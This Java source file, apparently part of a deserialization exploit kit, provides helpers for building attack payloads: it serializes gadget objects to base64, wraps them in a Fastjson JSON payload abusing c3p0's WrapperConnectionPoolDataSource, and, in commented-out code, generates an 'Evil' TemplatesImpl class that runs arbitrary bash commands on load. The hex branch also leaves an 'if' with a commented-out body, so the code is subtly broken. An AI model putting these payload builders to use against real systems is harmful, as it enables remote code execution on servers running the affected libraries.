package exp;//import com.alibaba.fastjson.JSON;
//import com.caucho.hessian.io.HessianInput;
//import com.caucho.hessian.io.HessianOutput;
//import javassist.ClassPool;
//import javassist.CtClass;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;

public class Tool {
    private Tool(){}
    public static void run(Object obj, String mode, String type) throws Exception {
        switch (type) {
            case "object" :
                String object = base64Encode(serialize(obj));
                System.out.println(object);
                if (mode.equals("debug"))
                    deserialize((base64Decode(object)));
                break;
            case "hessian" :
//                String hessian = base64Encode(hessianser(obj));
//                System.out.println(hessian);
//                if (mode.equals("debug"))
//                    hessiandeser(base64Decode(hessian));
                break;
            case "hex" :
                byte[] bytes = serialize(obj);
                String hex = "{\n" +
                        "    \"rand1\": {\n" +
                        "        \"@type\": \"java.lang.Class\",\n" +
                        "        \"val\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"\n" +
                        "    },\n" +
                        "    \"rand2\": {\n" +
                        "        \"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\n" +
                        "        \"userOverridesAsString\": \"HexAsciiSerializedMap:" + bytesToHexString(bytes, bytes.length) + ";\",\n" +
                        "    }\n" +
                        "}";
                System.out.println(hex);
                if (mode.equals("debug"))
//                    JSON.parseObject(hex);
                break;
        }
    }

    public static void deserialize(byte[] bytes) throws Exception {
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
    public static byte[] serialize(Object object) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object);
        return byteArrayOutputStream.toByteArray();
    }
//    public static void hessiandeser(byte[] bytes) throws Exception {
//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
//        HessianInput hessianInput = new HessianInput(byteArrayInputStream);
//        hessianInput.readObject();
//    }
//    public static byte[] hessianser(Object object) throws Exception {
//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
//        HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream);
//        hessianOutput.getSerializerFactory().setAllowNonSerializable(true);
//        hessianOutput.writeObject(object);
//        return byteArrayOutputStream.toByteArray();
//    }

    public static byte[] base64Decode(String string) {
        Base64.Decoder decoder = Base64.getDecoder();
        return decoder.decode(string);
    }
    public static String base64Encode(byte[] bytes) {
        Base64.Encoder encoder = Base64.getEncoder();
        return encoder.encodeToString(bytes);
    }
    public static String bytesToHexString(byte[] bArray, int length) {
        StringBuffer sb = new StringBuffer(length);
        for(int i = 0; i < length; ++i) {
            String sTemp = Integer.toHexString(255 & bArray[i]);
            if (sTemp.length() < 2) {
                sb.append(0);
            }
            sb.append(sTemp.toUpperCase());
        }
        return sb.toString();
    }

//    public static CtClass payload(String string) throws Exception {
//        String AbstractTranslet = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
//        ClassPool classPool = ClassPool.getDefault();
//        classPool.appendClassPath(AbstractTranslet);
//        CtClass payload = classPool.makeClass("Evil");
//        payload.setSuperclass(classPool.get(AbstractTranslet));
//        payload.makeClassInitializer().setBody(
//                "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\",\"" + string + "\"});");
//        return payload;
//    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static Field getField (final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);
            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
}